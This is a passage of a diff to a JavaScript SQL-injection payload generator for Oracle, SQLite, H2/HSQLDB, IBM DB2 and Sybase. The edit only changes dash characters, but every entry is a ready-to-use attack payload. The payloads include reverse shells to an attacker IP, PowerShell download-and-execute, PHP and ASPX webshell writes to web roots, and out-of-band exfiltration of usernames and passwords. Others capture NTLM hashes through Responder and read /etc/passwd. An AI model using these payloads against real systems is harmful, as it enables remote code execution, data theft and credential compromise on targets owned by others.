         payload: () => `' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--\n' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--\n' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT table_name FROM all_tables WHERE rownum=1))--\n' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT password FROM users WHERE rownum=1))--`
       });
@@ -1947,7 +1947,7 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
 
     if (techs.includes('blind')) {
       all.push({
-        id:'oracle-blind', title:'Oracle — blind time-based (DBMS_PIPE)',
+        id:'oracle-blind', title:'Oracle - blind time-based (DBMS_PIPE)',
         db:['oracle'], tech:['blind'], ctx:['post','get'],
         payload: () => `-- 5s delay = condition TRUE\n' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',5)--\n' AND 1=(SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE 1 END FROM dual)--\n' AND 1=(SELECT CASE WHEN SUBSTR(user,1,1)='S' THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE 1 END FROM dual)--`
       });
@@ -1955,7 +1955,7 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
 
     if (techs.includes('oob')) {
       all.push({
-        id:'oracle-oob', title:'Oracle — OOB via UTL_HTTP + UTL_INADDR',
+        id:'oracle-oob', title:'Oracle - OOB via UTL_HTTP + UTL_INADDR',
         db:['oracle'], tech:['oob'], ctx:['post','get'],
         payload: (ip) => `' UNION SELECT UTL_HTTP.REQUEST('http://${ip}/'||(SELECT user FROM dual)),NULL FROM dual--\n' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.${ip}'),NULL FROM dual--\n\n-- base64-encode the value for safe DNS label:\n' UNION SELECT UTL_HTTP.REQUEST('http://${ip}/?x='||utl_encode.base64_encode(utl_raw.cast_to_raw((SELECT password FROM users WHERE rownum=1)))),NULL FROM dual--`
       });
@@ -1967,7 +1967,7 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
 
     if (techs.includes('rce')) {
       all.push({
-        id:'sqlite-loadext', title:'SQLite — load_extension RCE (if enabled)',
+        id:'sqlite-loadext', title:'SQLite - load_extension RCE (if enabled)',
         db:['sqlite'], tech:['rce'], ctx:['post','get'],
         payload: (ip,port) => `-- load_extension disabled by default in most deployments\n-- requires: SQLITE_ENABLE_LOAD_EXTENSION at compile time\n' UNION SELECT load_extension('/tmp/rev.so','_init')--\n\n-- compile the shared lib on Kali:\n-- cat > rev.c << 'EOF'\n-- #include <stdlib.h>\n-- void _init() { system("bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1'"); }\n-- EOF\n-- gcc -shared -fPIC -nostartfiles -o /tmp/rev.so rev.c`,
         note:(ip,port) => `nc -lvnp ${port}  ←  start first. Then deliver rev.so to a writable path on target.`
@@ -1976,14 +1976,14 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
 
     if (techs.includes('fw')) {
       all.push({
-        id:'sqlite-attach-webshell', title:'SQLite — ATTACH DATABASE file write (no writefile() needed)',
+        id:'sqlite-attach-webshell', title:'SQLite - ATTACH DATABASE file write (no writefile() needed)',
         db:['sqlite'], tech:['rce','fw'], ctx:['post','get'],
-        payload: (ip,port) => `-- ATTACH DATABASE creates a new SQLite file at any writable path\n-- No special functions needed — works in default SQLite builds\n\n-- Write PHP webshell to web root:\n' UNION SELECT 1,2,3 WHERE 1=1 AND (ATTACH DATABASE '/var/www/html/sh.php' AS pwn)--\n' UNION SELECT 1,(SELECT 1 FROM (SELECT 1) WHERE 1=1 AND (ATTACH DATABASE '/var/www/html/sh.php' AS pwn)),3--\n'; ATTACH DATABASE '/var/www/html/sh.php' AS pwn;--\n'; CREATE TABLE pwn.x (y TEXT);--\n'; INSERT INTO pwn.x VALUES ('<?php system($_GET[c]);?>');--\n\n-- Windows IIS path:\n'; ATTACH DATABASE 'C:\\inetpub\\wwwroot\\sh.aspx' AS pwn;--\n'; CREATE TABLE pwn.x (y TEXT);--\n'; INSERT INTO pwn.x VALUES ('<%@ Page Language="C#"%><% var p=new System.Diagnostics.Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+Request["c"];p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardOutput=true;p.Start();Response.Write(p.StandardOutput.ReadToEnd()); %>');--\n\n-- Trigger reverse shell via curl after webshell is written:\n-- curl "http://TARGET/sh.php?c=bash+-c+'bash+-i+>%26+/dev/tcp/${ip}/${port}+0>%261'"`,
-        note:(ip,port) => `ATTACH creates a real file on disk. Note: SQLite header bytes prepend the file — PHP parser ignores them. nc -lvnp ${port}`
+        payload: (ip,port) => `-- ATTACH DATABASE creates a new SQLite file at any writable path\n-- No special functions needed - works in default SQLite builds\n\n-- Write PHP webshell to web root:\n' UNION SELECT 1,2,3 WHERE 1=1 AND (ATTACH DATABASE '/var/www/html/sh.php' AS pwn)--\n' UNION SELECT 1,(SELECT 1 FROM (SELECT 1) WHERE 1=1 AND (ATTACH DATABASE '/var/www/html/sh.php' AS pwn)),3--\n'; ATTACH DATABASE '/var/www/html/sh.php' AS pwn;--\n'; CREATE TABLE pwn.x (y TEXT);--\n'; INSERT INTO pwn.x VALUES ('<?php system($_GET[c]);?>');--\n\n-- Windows IIS path:\n'; ATTACH DATABASE 'C:\\inetpub\\wwwroot\\sh.aspx' AS pwn;--\n'; CREATE TABLE pwn.x (y TEXT);--\n'; INSERT INTO pwn.x VALUES ('<%@ Page Language="C#"%><% var p=new System.Diagnostics.Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+Request["c"];p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardOutput=true;p.Start();Response.Write(p.StandardOutput.ReadToEnd()); %>');--\n\n-- Trigger reverse shell via curl after webshell is written:\n-- curl "http://TARGET/sh.php?c=bash+-c+'bash+-i+>%26+/dev/tcp/${ip}/${port}+0>%261'"`,
+        note:(ip,port) => `ATTACH creates a real file on disk. Note: SQLite header bytes prepend the file - PHP parser ignores them. nc -lvnp ${port}`
       });
 
       all.push({
-        id:'sqlite-writefile', title:'SQLite — writefile / readfile (some builds)',
+        id:'sqlite-writefile', title:'SQLite - writefile / readfile (some builds)',
         db:['sqlite'], tech:['fw'], ctx:['post','get'],
         payload: () => `' UNION SELECT writefile('/var/www/html/shell.php','<?php system($_GET[c]);?>')--\n' UNION SELECT readfile('/etc/passwd')--\n' UNION SELECT readfile('/proc/self/environ')--\n' UNION SELECT readfile('/proc/self/cmdline')--`
       });
@@ -1991,7 +1991,7 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
 
     if (techs.includes('union')) {
       all.push({
-        id:'sqlite-union-chain', title:'SQLite — UNION enum via sqlite_master',
+        id:'sqlite-union-chain', title:'SQLite - UNION enum via sqlite_master',
         db:['sqlite'], tech:['union'], ctx:['post','get'],
         payload: () => `' UNION SELECT 1,sqlite_version(),3--\n' UNION SELECT 1,group_concat(name),3 FROM sqlite_master WHERE type='table'--\n' UNION SELECT 1,group_concat(sql),3 FROM sqlite_master WHERE name='users'--\n' UNION SELECT 1,group_concat(username||':'||password),3 FROM users--`
       });
@@ -1999,27 +1999,27 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
 
     if (techs.includes('blind')) {
       all.push({
-        id:'sqlite-blind', title:'SQLite — blind via CPU burn (no SLEEP)',
+        id:'sqlite-blind', title:'SQLite - blind via CPU burn (no SLEEP)',
         db:['sqlite'], tech:['blind'], ctx:['post','get'],
-        payload: () => `-- SQLite has no SLEEP() — use randomblob CPU burn:\n' AND 1=(SELECT LIKE('ABCDE',randomblob(500000000/2)))--\n' AND 1=(CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN randomblob(500000000) ELSE 1 END)--\n' AND 1=(CASE WHEN SUBSTR((SELECT password FROM users LIMIT 1),1,1)='a' THEN randomblob(500000000) ELSE 1 END)--`
+        payload: () => `-- SQLite has no SLEEP() - use randomblob CPU burn:\n' AND 1=(SELECT LIKE('ABCDE',randomblob(500000000/2)))--\n' AND 1=(CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN randomblob(500000000) ELSE 1 END)--\n' AND 1=(CASE WHEN SUBSTR((SELECT password FROM users LIMIT 1),1,1)='a' THEN randomblob(500000000) ELSE 1 END)--`
       });
     }
 
     if (techs.includes('err')) {
       all.push({
-        id:'sqlite-err', title:'SQLite — error-based via type coercion (framework-dependent)',
+        id:'sqlite-err', title:'SQLite - error-based via type coercion (framework-dependent)',
         db:['sqlite'], tech:['err'], ctx:['post','get'],
-        payload: () => `-- SQLite errors rarely propagate to HTTP response — framework-dependent\n-- Type cast (may appear in error message if app exposes raw exceptions):\n' AND 1=CAST((SELECT sqlite_version()) AS blob)--\n' AND 1=CAST((SELECT group_concat(name) FROM sqlite_master WHERE type='table') AS blob)--\n\n-- TYPEOF trick (boolean — TRUE if column is not integer):\n' AND TYPEOF((SELECT sqlite_version()))='integer'--\n\n-- Division by zero (raises error in some frameworks):\n' UNION SELECT 1/0--\n' UNION SELECT CAST(group_concat(name) AS integer) FROM sqlite_master--\n\n-- If app shows raw SQLite errors, the CAST value appears in the error string`,
+        payload: () => `-- SQLite errors rarely propagate to HTTP response - framework-dependent\n-- Type cast (may appear in error message if app exposes raw exceptions):\n' AND 1=CAST((SELECT sqlite_version()) AS blob)--\n' AND 1=CAST((SELECT group_concat(name) FROM sqlite_master WHERE type='table') AS blob)--\n\n-- TYPEOF trick (boolean - TRUE if column is not integer):\n' AND TYPEOF((SELECT sqlite_version()))='integer'--\n\n-- Division by zero (raises error in some frameworks):\n' UNION SELECT 1/0--\n' UNION SELECT CAST(group_concat(name) AS integer) FROM sqlite_master--\n\n-- If app shows raw SQLite errors, the CAST value appears in the error string`,
         note:'SQLite errors rarely bubble to HTTP. Fall back to blind/timing if no error visible.'
       });
     }
 
     if (techs.includes('oob')) {
       all.push({
-        id:'sqlite-oob', title:'SQLite — OOB (no native network — load_extension or app-layer only)',
+        id:'sqlite-oob', title:'SQLite - OOB (no native network - load_extension or app-layer only)',
         db:['sqlite'], tech:['oob'], ctx:['post','get'],
-        payload: (ip) => `-- SQLite has NO native network functions — direct OOB is not possible\n-- load_extension path (requires SQLITE_ENABLE_LOAD_EXTENSION compile flag):\n' UNION SELECT load_extension('/tmp/oob.so','_init')--\n\n-- Application-layer OOB (depends on wrapper language):\n-- Python app: trigger import socket; socket.getaddrinfo('data.${ip}',80)\n-- PHP: if app uses exec() wrapper around SQLite query result\n\n-- Practical alternative — use randomblob timing instead:\n' AND 1=(SELECT LIKE('ABCDE',randomblob(1000000000)))--  -- ~3s delay on most hardware`,
-        note:`SQLite is embedded — no network calls possible natively. Use blind timing (randomblob) for data exfil.`
+        payload: (ip) => `-- SQLite has NO native network functions - direct OOB is not possible\n-- load_extension path (requires SQLITE_ENABLE_LOAD_EXTENSION compile flag):\n' UNION SELECT load_extension('/tmp/oob.so','_init')--\n\n-- Application-layer OOB (depends on wrapper language):\n-- Python app: trigger import socket; socket.getaddrinfo('data.${ip}',80)\n-- PHP: if app uses exec() wrapper around SQLite query result\n\n-- Practical alternative - use randomblob timing instead:\n' AND 1=(SELECT LIKE('ABCDE',randomblob(1000000000)))--  -- ~3s delay on most hardware`,
+        note:`SQLite is embedded - no network calls possible natively. Use blind timing (randomblob) for data exfil.`
       });
     }
   }
@@ -2028,23 +2028,23 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
   if (dbs.includes('h2')) {
     if (techs.includes('rce')) {
       all.push({
-        id:'h2-alias-rce', title:'H2 — CREATE ALIAS Java RCE (Spring Boot / H2 console)',
+        id:'h2-alias-rce', title:'H2 - CREATE ALIAS Java RCE (Spring Boot / H2 console)',
         db:['h2'], tech:['rce'], ctx:['post','get'],
         payload: (ip,port) => `'; CREATE ALIAS IF NOT EXISTS EXEC AS $$ String exec(String cmd) throws Exception { Runtime rt = Runtime.getRuntime(); String[] c = new String[]{"bash","-c",cmd}; Process p = rt.exec(c); java.util.Scanner s = new java.util.Scanner(p.getInputStream()).useDelimiter("\\\\A"); return s.hasNext() ? s.next() : ""; } $$;--\n'; CALL EXEC('bash -i >& /dev/tcp/${ip}/${port} 0>&1');--`,
-        note:(ip,port) => `H2 executes Java in-process — no binary needed on target. nc -lvnp ${port}. Common in Spring Boot apps with H2 dev console exposed.`
+        note:(ip,port) => `H2 executes Java in-process - no binary needed on target. nc -lvnp ${port}. Common in Spring Boot apps with H2 dev console exposed.`
       });
 
       all.push({
-        id:'hsql-runtime', title:'HSQLDB — direct java.lang.Runtime invocation',
+        id:'hsql-runtime', title:'HSQLDB - direct java.lang.Runtime invocation',
         db:['h2'], tech:['rce'], ctx:['post','get'],
-        payload: (ip,port) => `'; CALL "java.lang.Runtime".getRuntime().exec(new String[]{"bash","-c","bash -i >& /dev/tcp/${ip}/${port} 0>&1"});--\n-- alt (base64 — avoids special char issues in injection):\n'; CALL "java.lang.Runtime".getRuntime().exec(new String[]{"bash","-c","{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9MSE9TVC9QT1JUIDA+JjE=}|{base64,-d}|{bash,-i}"});--`,
+        payload: (ip,port) => `'; CALL "java.lang.Runtime".getRuntime().exec(new String[]{"bash","-c","bash -i >& /dev/tcp/${ip}/${port} 0>&1"});--\n-- alt (base64 - avoids special char issues in injection):\n'; CALL "java.lang.Runtime".getRuntime().exec(new String[]{"bash","-c","{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9MSE9TVC9QT1JUIDA+JjE=}|{base64,-d}|{bash,-i}"});--`,
         note:(ip,port) => `Replace base64 payload: echo -n "bash -i >& /dev/tcp/${ip}/${port} 0>&1"|base64 -w0`
       });
     }
 
     if (techs.includes('union')) {
       all.push({
-        id:'h2-union', title:'H2/HSQLDB — UNION enumeration via INFORMATION_SCHEMA',
+        id:'h2-union', title:'H2/HSQLDB - UNION enumeration via INFORMATION_SCHEMA',
         db:['h2'], tech:['union'], ctx:['post','get'],
         payload: () => `-- H2 uses standard INFORMATION_SCHEMA (SQL-92 compatible)\n' ORDER BY 1--\n' ORDER BY 2--\n' UNION SELECT NULL,NULL--\n' UNION SELECT H2VERSION(),USER()--\n' UNION SELECT table_name,NULL FROM information_schema.tables LIMIT 1--\n' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='USERS' LIMIT 1--\n' UNION SELECT concat(username,':',password),NULL FROM users LIMIT 1--`,
         note:'H2 is case-insensitive for identifiers. INFORMATION_SCHEMA always available.'
@@ -2053,28 +2053,28 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
 
     if (techs.includes('err')) {
       all.push({
-        id:'h2-err', title:'H2/HSQLDB — error-based via CAST type coercion',
+        id:'h2-err', title:'H2/HSQLDB - error-based via CAST type coercion',
         db:['h2'], tech:['err'], ctx:['post','get'],
         payload: () => `-- H2 CAST errors include the value in the exception message:\n' AND 1=CAST(H2VERSION() AS int)--\n' AND 1=CAST(USER() AS int)--\n' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--\n' AND 1=CAST((SELECT column_name FROM information_schema.columns WHERE table_name='USERS' LIMIT 1) AS int)--\n' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`,
-        note:'H2 exception: "Data conversion error converting..." — value appears in the error string.'
+        note:'H2 exception: "Data conversion error converting..." - value appears in the error string.'
       });
     }
 
     if (techs.includes('blind')) {
       all.push({
-        id:'h2-blind', title:'H2/HSQLDB — blind boolean + HASH compute-based timing',
+        id:'h2-blind', title:'H2/HSQLDB - blind boolean + HASH compute-based timing',
         db:['h2'], tech:['blind'], ctx:['post','get'],
-        payload: () => `-- H2 has no SLEEP() — use HASH() for CPU-heavy timing (~1-3s):\n-- Boolean:\n' AND (SELECT COUNT(*) FROM information_schema.tables)>0--\n' AND SUBSTRING(H2VERSION(),1,1)='2'--\n' AND (SELECT COUNT(*) FROM users)>0--\n\n-- Time-based via HASH iteration:\n' AND 1=(SELECT TOP 1 HASH('SHA256',STRINGTOUTF8(table_name),1000000) FROM information_schema.tables)--\n\n-- Conditional timing (gates heavy compute on TRUE condition):\n' AND CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN (SELECT TOP 1 HASH('SHA256',STRINGTOUTF8(table_name),1000000) FROM information_schema.tables) ELSE 0 END IS NOT NULL--`,
-        note:'HASH(algo,data,iterations) — 1000000 iterations ≈ 1-3s. Adjust for target speed.'
+        payload: () => `-- H2 has no SLEEP() - use HASH() for CPU-heavy timing (~1-3s):\n-- Boolean:\n' AND (SELECT COUNT(*) FROM information_schema.tables)>0--\n' AND SUBSTRING(H2VERSION(),1,1)='2'--\n' AND (SELECT COUNT(*) FROM users)>0--\n\n-- Time-based via HASH iteration:\n' AND 1=(SELECT TOP 1 HASH('SHA256',STRINGTOUTF8(table_name),1000000) FROM information_schema.tables)--\n\n-- Conditional timing (gates heavy compute on TRUE condition):\n' AND CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN (SELECT TOP 1 HASH('SHA256',STRINGTOUTF8(table_name),1000000) FROM information_schema.tables) ELSE 0 END IS NOT NULL--`,
+        note:'HASH(algo,data,iterations) - 1000000 iterations ≈ 1-3s. Adjust for target speed.'
       });
     }
 
     if (techs.includes('oob')) {
       all.push({
-        id:'h2-oob', title:'H2/HSQLDB — OOB HTTP exfil via Java URL (CREATE ALIAS)',
+        id:'h2-oob', title:'H2/HSQLDB - OOB HTTP exfil via Java URL (CREATE ALIAS)',
         db:['h2'], tech:['oob'], ctx:['post','get'],
         payload: (ip) => `'; CREATE ALIAS IF NOT EXISTS HTTP_GET AS $$ String httpGet(String url) throws Exception { return new java.util.Scanner(new java.net.URL(url).openStream()).useDelimiter("\\\\A").next(); } $$;--\n'; CALL HTTP_GET('http://${ip}/?v='||(SELECT H2VERSION()));--\n-- exfil table names:\n'; CALL HTTP_GET('http://${ip}/?t='||(SELECT listagg(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM information_schema.tables WHERE table_type='TABLE'));--\n-- cleanup:\n'; DROP ALIAS IF EXISTS HTTP_GET;--`,
-        note:`Kali: python3 -m http.server 80  — watch access log for ?v= callback confirming H2 version.`
+        note:`Kali: python3 -m http.server 80  - watch access log for ?v= callback confirming H2 version.`
       });
     }
   }
@@ -2083,7 +2083,7 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
   if (dbs.includes('db2')) {
     if (techs.includes('rce')) {
       all.push({
-        id:'db2-rce', title:'IBM DB2 — ADMIN_CMD shell execution',
+        id:'db2-rce', title:'IBM DB2 - ADMIN_CMD shell execution',
         db:['db2'], tech:['rce'], ctx:['post','get'],
         payload: (ip,port) => `'; CALL SYSPROC.ADMIN_CMD('! bash -i >& /dev/tcp/${ip}/${port} 0>&1');--\n-- Windows:\n'; CALL SYSPROC.ADMIN_CMD('! powershell -nop -c "IEX(iwr http://${ip}:${port}/s.ps1 -useb)"');--`,
         note:'Requires SYSADM/DBADM authority.'
@@ -2091,7 +2091,7 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
     }
     if (techs.includes('union')) {
       all.push({
-        id:'db2-union', title:'IBM DB2 — UNION enumeration (sysibm.sysdummy1)',
+        id:'db2-union', title:'IBM DB2 - UNION enumeration (sysibm.sysdummy1)',
         db:['db2'], tech:['union'], ctx:['post','get'],
         payload: () => `' UNION SELECT NULL FROM sysibm.sysdummy1--\n' UNION SELECT CURRENT USER FROM sysibm.sysdummy1--\n' UNION SELECT tabname,NULL FROM syscat.tables FETCH FIRST 1 ROWS ONLY--\n' UNION SELECT colname,NULL FROM syscat.columns WHERE tabname='USERS' FETCH FIRST 1 ROWS ONLY--`,
         note:'DB2 requires FROM clause. sysibm.sysdummy1 is the equivalent of Oracle dual.'
@@ -2100,7 +2100,7 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
 
     if (techs.includes('err')) {
       all.push({
-        id:'db2-err', title:'IBM DB2 — error-based via CAST / XMLELEMENT type coercion',
+        id:'db2-err', title:'IBM DB2 - error-based via CAST / XMLELEMENT type coercion',
         db:['db2'], tech:['err'], ctx:['post','get'],
         payload: () => `-- DB2 CAST error leaks value in exception message:\n' AND 1=CAST((SELECT current_user FROM sysibm.sysdummy1) AS INTEGER)--\n' AND 1=CAST((SELECT current_server FROM sysibm.sysdummy1) AS INTEGER)--\n' AND 1=CAST((SELECT tabname FROM syscat.tables FETCH FIRST 1 ROWS ONLY) AS INTEGER)--\n\n-- XMLELEMENT error exfil (DB2 9.7+):\n' AND EXTRACTVALUE(XMLELEMENT(NAME a,(SELECT current_user FROM sysibm.sysdummy1)),1)=1--\n\n-- HEX encoding trick (confirms string value as number error):\n' AND 1=(SELECT BIGINT(HEX(current_user)) FROM sysibm.sysdummy1)--`,
         note:'DB2 exception usually: "An expression of type STRING cannot be used... expected INTEGER". Value appears in error.'
@@ -2109,18 +2109,18 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
 
     if (techs.includes('blind')) {
       all.push({
-        id:'db2-blind', title:'IBM DB2 — blind boolean + recursive CTE time delay',
+        id:'db2-blind', title:'IBM DB2 - blind boolean + recursive CTE time delay',
         db:['db2'], tech:['blind'], ctx:['post','get'],
-        payload: () => `-- DB2 has no SLEEP() — use WITH RECURSIVE for CPU delay:\n-- Boolean:\n' AND (SELECT COUNT(*) FROM syscat.tables)>0--\n' AND SUBSTR((SELECT current_user FROM sysibm.sysdummy1),1,1)='D'--\n\n-- Time-based via recursive CTE (adjust n limit for ~5s):\n' AND 1=(WITH r(n) AS (VALUES(1) UNION ALL SELECT n+1 FROM r WHERE n<9999999) SELECT COUNT(*) FROM r)--\n\n-- Conditional timing:\n' AND CASE WHEN (SELECT COUNT(*) FROM syscat.tables)>0 THEN (WITH r(n) AS (VALUES(1) UNION ALL SELECT n+1 FROM r WHERE n<9999999) SELECT COUNT(*) FROM r) ELSE 1 END=1--`,
+        payload: () => `-- DB2 has no SLEEP() - use WITH RECURSIVE for CPU delay:\n-- Boolean:\n' AND (SELECT COUNT(*) FROM syscat.tables)>0--\n' AND SUBSTR((SELECT current_user FROM sysibm.sysdummy1),1,1)='D'--\n\n-- Time-based via recursive CTE (adjust n limit for ~5s):\n' AND 1=(WITH r(n) AS (VALUES(1) UNION ALL SELECT n+1 FROM r WHERE n<9999999) SELECT COUNT(*) FROM r)--\n\n-- Conditional timing:\n' AND CASE WHEN (SELECT COUNT(*) FROM syscat.tables)>0 THEN (WITH r(n) AS (VALUES(1) UNION ALL SELECT n+1 FROM r WHERE n<9999999) SELECT COUNT(*) FROM r) ELSE 1 END=1--`,
         note:'DB2 WITH RECURSIVE available from DB2 9.7+. Adjust 9999999 limit based on target response time.'
       });
     }
 
     if (techs.includes('oob')) {
       all.push({
-        id:'db2-oob', title:'IBM DB2 — OOB via ADMIN_CMD DNS / UTL_HTTP (iSeries)',
+        id:'db2-oob', title:'IBM DB2 - OOB via ADMIN_CMD DNS / UTL_HTTP (iSeries)',
         db:['db2'], tech:['oob'], ctx:['post','get'],
-        payload: (ip) => `-- Linux — exfil current_user via DNS:\n'; CALL SYSPROC.ADMIN_CMD('! nslookup -q=A '||(SELECT current_user FROM sysibm.sysdummy1)||'.${ip}');--\n-- UTL_HTTP (DB2 for i / iSeries):\n' AND 1=(SELECT UTL_HTTP.REQUEST('http://${ip}/?u='||(SELECT current_user FROM sysibm.sysdummy1)) FROM sysibm.sysdummy1)--\n-- Windows DB2:\n'; CALL SYSPROC.ADMIN_CMD('! powershell Resolve-DnsName '||(SELECT current_user FROM sysibm.sysdummy1)||'.${ip}');--\n-- Kali: python3 -m http.server 80  (watch access log for callback)`,
+        payload: (ip) => `-- Linux - exfil current_user via DNS:\n'; CALL SYSPROC.ADMIN_CMD('! nslookup -q=A '||(SELECT current_user FROM sysibm.sysdummy1)||'.${ip}');--\n-- UTL_HTTP (DB2 for i / iSeries):\n' AND 1=(SELECT UTL_HTTP.REQUEST('http://${ip}/?u='||(SELECT current_user FROM sysibm.sysdummy1)) FROM sysibm.sysdummy1)--\n-- Windows DB2:\n'; CALL SYSPROC.ADMIN_CMD('! powershell Resolve-DnsName '||(SELECT current_user FROM sysibm.sysdummy1)||'.${ip}');--\n-- Kali: python3 -m http.server 80  (watch access log for callback)`,
         note:'ADMIN_CMD DNS requires SYSADM. UTL_HTTP is DB2 for i only. Burp Collaborator works for DNS callbacks.'
       });
     }
@@ -2130,7 +2130,7 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
   if (dbs.includes('sybase')) {
     if (techs.includes('rce')) {
       all.push({
-        id:'sybase-xp', title:'Sybase/SAP ASE — xp_cmdshell (near-identical to MSSQL)',
+        id:'sybase-xp', title:'Sybase/SAP ASE - xp_cmdshell (near-identical to MSSQL)',
         db:['sybase'], tech:['rce'], ctx:['post','get'],
         payload: (ip,port) => `'; EXEC xp_cmdshell 'bash -i >& /dev/tcp/${ip}/${port} 0>&1';--\n-- enable if needed:\n'; EXEC sp_configure 'xp_cmdshell',1; go--`,
         note:'Sybase xp_cmdshell requires sa privileges. Same exploitation approach as MSSQL.'
@@ -2138,7 +2138,7 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
     }
     if (techs.includes('union')) {
       all.push({
-        id:'sybase-union', title:'Sybase — UNION enumeration',
+        id:'sybase-union', title:'Sybase - UNION enumeration',
         db:['sybase'], tech:['union'], ctx:['post','get'],
         payload: () => `' UNION SELECT TOP 1 name,NULL FROM sysobjects WHERE xtype='U'--\n' UNION SELECT TOP 1 col_name(id,1),NULL FROM sysobjects WHERE name='users'--\n' UNION SELECT TOP 1 username,password FROM users--`
       });
@@ -2146,16 +2146,16 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
 
     if (techs.includes('err')) {
       all.push({
-        id:'sybase-err', title:'Sybase/SAP ASE — error-based via CONVERT (identical to MSSQL)',
+        id:'sybase-err', title:'Sybase/SAP ASE - error-based via CONVERT (identical to MSSQL)',
         db:['sybase'], tech:['err'], ctx:['post','get'],
-        payload: () => `-- Sybase CONVERT error leaks value in exception — same technique as MSSQL:\n' AND 1=CONVERT(int,(SELECT @@version))--\n' AND 1=CONVERT(int,(SELECT db_name()))--\n' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--\n' AND 1=CONVERT(int,(SELECT TOP 1 col_name(id,1) FROM sysobjects WHERE name='users'))--\n' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users))--`,
+        payload: () => `-- Sybase CONVERT error leaks value in exception - same technique as MSSQL:\n' AND 1=CONVERT(int,(SELECT @@version))--\n' AND 1=CONVERT(int,(SELECT db_name()))--\n' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--\n' AND 1=CONVERT(int,(SELECT TOP 1 col_name(id,1) FROM sysobjects WHERE name='users'))--\n' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users))--`,
         note:'Sybase error: "Implicit conversion from datatype VARCHAR to INT is not allowed". Value appears in error.'
       });
     }
 
     if (techs.includes('blind')) {
       all.push({
-        id:'sybase-blind', title:'Sybase/SAP ASE — blind boolean + WAITFOR time-based',
+        id:'sybase-blind', title:'Sybase/SAP ASE - blind boolean + WAITFOR time-based',
         db:['sybase'], tech:['blind'], ctx:['post','get'],
         payload: () => `-- Boolean:\n' AND (SELECT COUNT(*) FROM sysobjects WHERE xtype='U')>0--\n' AND SUBSTRING(db_name(),1,1)='m'--\n' AND LEN((SELECT TOP 1 password FROM users))>7--\n\n-- Time-based WAITFOR (identical to MSSQL):\n'; WAITFOR DELAY '0:0:5'--\n'; IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '0:0:5'--\n'; IF SUBSTRING((SELECT TOP 1 password FROM users WHERE username='admin'),1,1)='a' WAITFOR DELAY '0:0:5'--`,
         note:'Sybase WAITFOR DELAY syntax identical to MSSQL. 5s delay = condition TRUE.'
@@ -2164,9 +2164,9 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
 
     if (techs.includes('oob')) {
       all.push({
-        id:'sybase-oob', title:'Sybase/SAP ASE — OOB via xp_dirtree SMB (identical to MSSQL)',
+        id:'sybase-oob', title:'Sybase/SAP ASE - OOB via xp_dirtree SMB (identical to MSSQL)',
         db:['sybase'], tech:['oob'], ctx:['post','get'],
-        payload: (ip) => `-- xp_dirtree SMB trigger — captures NTLMv2 hash via Responder:\n'; EXEC xp_dirtree '\\\\${ip}\\share';--\n\n-- Exfil data in UNC hostname:\n'; DECLARE @h varchar(256); SELECT @h=user_name(); EXEC xp_dirtree('\\\\'+@h+'.${ip}\\x');--\n\n-- Kali listeners:\n-- sudo responder -I tun0 -wv\n-- OR: impacket-smbserver share . -smb2support\n-- Crack captured hash: hashcat -m 5600 hash.txt rockyou.txt`,
+        payload: (ip) => `-- xp_dirtree SMB trigger - captures NTLMv2 hash via Responder:\n'; EXEC xp_dirtree '\\\\${ip}\\share';--\n\n-- Exfil data in UNC hostname:\n'; DECLARE @h varchar(256); SELECT @h=user_name(); EXEC xp_dirtree('\\\\'+@h+'.${ip}\\x');--\n\n-- Kali listeners:\n-- sudo responder -I tun0 -wv\n-- OR: impacket-smbserver share . -smb2support\n-- Crack captured hash: hashcat -m 5600 hash.txt rockyou.txt`,
         note:`Sybase xp_dirtree behaves identically to MSSQL. Requires Windows Sybase installation for SMB OOB.`
       });
     }
